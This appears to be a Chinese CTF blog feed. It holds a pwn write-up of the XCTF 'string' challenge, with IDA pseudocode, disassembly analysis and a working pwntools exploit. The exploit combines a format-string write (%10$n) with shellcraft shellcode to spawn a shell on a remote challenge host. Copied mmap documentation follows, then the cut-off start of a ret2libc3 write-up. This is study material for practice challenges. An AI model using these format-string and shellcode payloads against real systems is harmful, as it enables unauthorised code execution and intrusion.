        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_easy/string'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>保护全开有点狠，但是不用慌，这应该告诉我们栈溢出控制程序是不可能的了</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><p>程序比较大，下面是进行拆分排序后的函数组合</p><pre class=" language-c"><code class="language-c">main：__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_8</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400996</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment" spellcheck="true">// 菜单输出，不用在意</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// 开辟内存空间</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we will tell you two secret ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[0] is %x\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 将输出第一个和第二个元素的地址</span>                                                <span class="token comment" spellcheck="true">// </span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[1] is %x\n"</span><span class="token punctuation">,</span> v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"do not tell anyone "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400D72</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 将开辟内存空间传入该函数</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The End.....Really?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400D72函数：<span class="token comment" spellcheck="true">// a1是前面开辟内存空间的地址</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400D72</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">12</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating a new player."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_400A7D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 只能输入east</span>    <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>    <span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间由读写执行权 传入了开辟空间的地址a1</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hei! What's up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400A7D函数：执行后我们能且只能输入east，没多大用sub_400BB9函数：<span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-7Ch]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>  <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">", what happend?! You just travel , and find another hole"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"A voice heard in your mind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your wish is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>                                                <span class="token comment" spellcheck="true">// </span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hear it, I hear it...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span>函数：<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400CA6</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Dragon say: HaHa! you were supposed to have a normal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RPG game, but I have changed it! you have no weapon and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"skill! you could not defeat me !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"That's sound terrible! you meet final boss!but you level is ONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true">// 第一个元素等于第二个元素，这两个元素地址是相邻的</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">4096uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间有读写执行权</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这里比较难理解</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="3：解决疑难语句"><a href="#3：解决疑难语句" class="headerlink" title="3：解决疑难语句"></a>3：解决疑难语句</h2><p><strong>对于((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这条语句我查了半天也没怎么理解，也就是说这个伪代码看不懂。在这种时候千万别忘了我们还可以看反汇编内容！！这一块区域的反汇编：</strong></p><pre class=" language-bash"><code class="language-bash">mov     edi, offset aWizardIWillHel <span class="token punctuation">;</span> <span class="token string">"Wizard: I will help you! USE YOU SPELL"</span>   call    putsmov     r9d, 0          <span class="token punctuation">;</span> offsetmov     r8d, 0FFFFFFFFh <span class="token punctuation">;</span> fdmov     ecx, 33         <span class="token punctuation">;</span> flagsmov     edx, 7          <span class="token punctuation">;</span> protmov     esi, 4096       <span class="token punctuation">;</span> lenmov     edi, 0          <span class="token punctuation">;</span> addrcall    mmapmov     <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>, raxmov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 256        <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    <span class="token function">read</span>mov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edi, 0call    rax</code></pre><p><strong>1-2：显然是对应：puts(“Wizard: I will help you! USE YOU SPELL”);这条语句，执行了这一条就能说明程序进入了if语句</strong><br><strong>3-9：是执行了mmap函数，先是将该函数的参数从右到左传入寄存器和一些特别的地方，最后进行调用mmap函数</strong><br><strong>10-15：主要是执行read函数，但我们可以发现这一段除了将传read函数的参数，还进行了其他操作。即第10第11条，将rax的值赋给[rbp+buf]代表的地址上面，又将[rbp+buf]代表的地址赋给rax。在传buf参数时，是将rax放入rsi，所以这个read函数将会入读数据到rax存放的地址上。结合IDA伪代码，这个地址就是可读可写可执行内存区，即[rbp+buf]所代表的地址。</strong><br><strong>16-18：将[rbp+buf]地址放入rax，17行应该不重要，18行就像调用函数一样直接调用rax。那么我们可以肯定((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1)可以执行程序读入的代码</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>1.main函数主要功能：开辟一个8字节的内存空间，该空间第一个元素大小赋值为68第二个元素大小赋值为85 ，输出两者的地址，然后进入sub_400D72(v4)函数<br>2.sub_400D72(v4)函数主要功能：输入一串字符作为角色名字，然后依次执行sub_400A7D()   sub_400BB9()  sub_400CA6((_DWORD *)a1)函数<br>3：sub_400A7D()函数主要功能：让用户输入test字符串，才能继续执行<br>4：sub_400BB9() 函数主要功能：输入1进入if语句，在该语句中先输入整数，再输入字符串，该字符串和后面的printf构成格式化字符串漏洞<br>5：sub_400CA6((_DWORD *)a1)函数主要功能：输出一堆废话 但是如果main函数中所开辟的空间中的第一个元素等于第二个元素，将映射一个有读写执行权的空间。然后在读取输入到空间中，最后那一串语句盲猜是要执行那段空间里面的数据</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>从main函数中得到两元素地址，在要执行sub_400BB9()函数时利用其包括的格式化字符串漏洞，改两个元素的值使其相等。这样在执行sub_400CA6((_DWORD *)a1)函数时就可以输入shellcode到一个映射空间，由下面的语句执行空间中的shellcode</strong></p><h2 id="4：exp"><a href="#4：exp" class="headerlink" title="4：exp"></a>4：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./string')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span><span class="token number">32219</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[0] is '</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token operator">//</span>获取地址sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[1] is '</span><span class="token punctuation">)</span>addr2 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token operator">//</span>获取地址<span class="token keyword">print</span> addr1<span class="token keyword">print</span> addr2<span class="token keyword">print</span> type<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'HUNTER'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'east'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#formal bug</span>payload3 <span class="token operator">=</span> <span class="token string">"AAA%082d"</span> <span class="token operator">+</span> <span class="token string">"%10$nAAA"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#构造格式化字符串payload时要注意参数位置，以及对应程序操作位数</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#input shell</span><span class="token triple-quoted-string string">'''payload4 = ""payload4 += "\x01\x30\x8f\xe2"payload4 += "\x13\xff\x2f\xe1"payload4 += "\x78\x46\x0e\x30"payload4 += "\x01\x90\x49\x1a"payload4 += "\x92\x1a\x08\x27"payload4 += "\xc2\x51\x03\x37"payload4 += "\x01\xdf\x2f\x62"payload4 += "\x69\x6e\x2f\x2f"payload4 += "\x73\x68"'''</span>payload4 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload4<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5：知识点"><a href="#5：知识点" class="headerlink" title="5：知识点"></a>5：知识点</h2><p>mmap函数 </p><blockquote><p>mmap函数是unix/linux下的系统调用。<br>当存在客户－服务程序中复制文件时候，其数据流如下，要经历四次数据复制，开销很大。<br><img src="https://s1.ax1x.com/2020/07/04/NzLPjU.png" alt=""><br>如果采用共享内存的方式，那么将大大优化IO操作，数据流变成了如下，数据只复制两次：<br><img src="https://s1.ax1x.com/2020/07/04/NzLCcT.png" alt=""><br>映射文件或设备到内存中，取消映射就是munmap函数。<br>语法如下：</p></blockquote><blockquote><p>void mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset);</p></blockquote><blockquote><p>int munmap(void *addr, size_t length);<br>该函数主要用途有三个：</p></blockquote><blockquote><p>1、将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</p></blockquote><blockquote><p>2、将特殊文件进行匿名内存映射，为关联进程提供共享内存空间；</p></blockquote><blockquote><p>3、为无关联的进程间的Posix共享内存（SystemV的共享内存操作是shmget/shmat）</p></blockquote><blockquote><p>我们来看下函数的入参选择：</p></blockquote><blockquote><p>1、参数addr：</p></blockquote><blockquote><p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p></blockquote><blockquote><p>2、参数length：</p></blockquote><blockquote><p>代表将文件中多大的部分映射到内存。</p></blockquote><blockquote><p>3、参数prot：</p></blockquote><blockquote><p>映射区域的保护方式。可以为以下几种方式的组合：</p></blockquote><blockquote><p>PROT_EXEC 映射区域可被执行</p></blockquote><blockquote><p>PROT_READ 映射区域可被读取</p></blockquote><blockquote><p>PROT_WRITE 映射区域可被写入</p></blockquote><blockquote><p>PROT_NONE 映射区域不能存取</p></blockquote><blockquote><p>4、参数flags：</p></blockquote><blockquote><p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p></blockquote><blockquote><p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。</p></blockquote><blockquote><p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p></blockquote><blockquote><p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p></blockquote><blockquote><p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p></blockquote><blockquote><p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p></blockquote><blockquote><p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p></blockquote><blockquote><p>5、参数fd：</p></blockquote><blockquote><p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。</p></blockquote><blockquote><p>6、参数offset：</p></blockquote><blockquote><p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。如下图内存映射文件的示例。<br><img src="https://s1.ax1x.com/2020/07/04/NzLFuF.png" alt=""></p></blockquote><p>原文：<a href="https://segmentfault.com/a/1190000014616732" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014616732</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki--ret2libc3</title>
      <link href="/2020/07/04/wiki-ret2libc3/"/>
      <url>/2020/07/04/wiki-ret2libc3/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/level3$ checksec ret2libc3<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level3/ret2libc3'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只有NX开启</p><h2 id="2：IDA-检查发现没有system和binsh字符串"><a href="#2：IDA-检查发现没有system和binsh字符串" class="headerlink" title="2：IDA 检查发现没有system和binsh字符串"></a>2：IDA 检查发现没有system和binsh字符串</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>显然此处gets存在溢出</p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   